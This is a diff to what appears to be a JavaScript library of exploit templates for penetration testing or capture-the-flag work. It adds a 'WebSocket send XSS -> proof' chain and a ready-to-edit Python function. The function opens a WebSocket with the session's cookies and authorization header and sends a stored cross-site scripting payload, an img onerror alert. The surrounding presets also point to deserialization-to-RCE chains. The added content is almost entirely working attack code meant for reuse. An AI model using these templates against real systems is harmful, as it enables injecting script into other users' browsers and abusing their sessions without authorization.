@@ -200,6 +200,10 @@ var PRESETS = [
     ["http-post-request","post_step"],
     ["proof-basic","proof"]
   ]},
+  {id:"ws-send-xss-proof", title:"WebSocket send XSS -> proof", steps:[
+    ["websocket-send-payload","send_ws_xss"],
+    ["proof-basic","proof"]
+  ]},
   {id:"deser-rce-proof", title:"deserialization -> RCE -> proof", steps:[
     ["deser-java-delivery","deliver_java_serialized_payload"],
     ["cmdi-runner","run_cmd"],
@@ -3593,6 +3597,77 @@ public class JdbcSqlRunner {
             return rr
     print("[*] if payload logs to server console, check logs/debugger now")
     return r
+`
+  },
+  {
+    id:"websocket-send-payload",
+    title:"REPLACE exploit() - WebSocket send payload",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"websocket_send_payload",
+    aliases:["websocket","ws","send","chat","xss","stored xss","socket send","send-message","group_id","token query","json message","text message"],
+    useWhen:"You need to send one payload over WebSocket, for example a stored XSS chat message delivered through a WS send endpoint.",
+    editFirst:["WS_PATH_OR_URL","QUERY","MESSAGE_MODE","TEXT_PAYLOAD","JSON_MESSAGE","ORIGIN","EXTRA_HEADERS"],
+    dependsOn:[],
+    sourceRefs:["v4"],
+    code:String.raw`def websocket_send_payload():
+    # Use when: chat/task endpoint receives messages over WebSocket, not HTTP.
+    # main.py use: duplicate and rename for send_chat_xss(), send_ws_note(), trigger_ws_job(), etc.
+    import websocket  # pip install websocket-client
+    from urllib.parse import urlencode
+
+    WS_PATH_OR_URL = "/send-message"       # EDIT path or full ws:// URL
+    QUERY = {                              # EDIT query params required by WS endpoint
+        "token": "REPLACE_TOKEN",
+        "group_id": "1",
+    }
+    ORIGIN = None                          # EDIT e.g. url("/") if server checks Origin
+    EXTRA_HEADERS = []                     # EDIT e.g. ["Authorization: Bearer TOKEN"]
+    USE_SESSION_COOKIES = True             # EDIT send current requests.Session cookies as Cookie header
+    USE_SESSION_AUTH = True                # EDIT copy s.headers["Authorization"] if present
+
+    MESSAGE_MODE = "text"                  # EDIT: text | json
+    TEXT_PAYLOAD = "<img src=x onerror='alert(1)'>"  # EDIT stored XSS or raw WS text
+    JSON_MESSAGE = {                       # EDIT match Burp WS frame shape
+        "text": TEXT_PAYLOAD,
+    }
+    RECV_AFTER_SEND = False                # EDIT True if endpoint replies immediately
+    RECV_LIMIT = 1                         # EDIT
+    EXPECT = ""                            # EDIT optional marker in received data
+
+    ws_url = WS_PATH_OR_URL if WS_PATH_OR_URL.startswith("ws") else url(WS_PATH_OR_URL).replace("http://", "ws://", 1).replace("https://", "wss://", 1)
+    clean_query = {k: v for k, v in QUERY.items() if v not in (None, "")}
+    if clean_query:
+        ws_url += ("&" if "?" in ws_url else "?") + urlencode(clean_query)
+
+    headers = list(EXTRA_HEADERS)
+    if USE_SESSION_AUTH and s.headers.get("Authorization"):
+        headers.append("Authorization: " + s.headers["Authorization"])
+    if USE_SESSION_COOKIES and s.cookies.get_dict():
+        cookie = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())
+        headers.append("Cookie: " + cookie)
+
+    message = TEXT_PAYLOAD if MESSAGE_MODE == "text" else json.dumps(JSON_MESSAGE)
+    dprint("WS URL:", ws_url)
+    dprint("WS headers:", headers)
+    dprint("WS message:", message)
+
+    ws = websocket.create_connection(ws_url, timeout=TIMEOUT, origin=ORIGIN, header=headers)
+    ws.send(message)
+    print("[+] websocket payload sent")
+
+    replies = []
+    if RECV_AFTER_SEND:
+        for _ in range(RECV_LIMIT):
+            data = ws.recv()
+            replies.append(data)
+            print("[ws]", data)
+    ws.close()
+
+    if EXPECT:
+        check(any(EXPECT in x for x in replies), "websocket expected marker not found")
+    return replies
 `
   },
   {
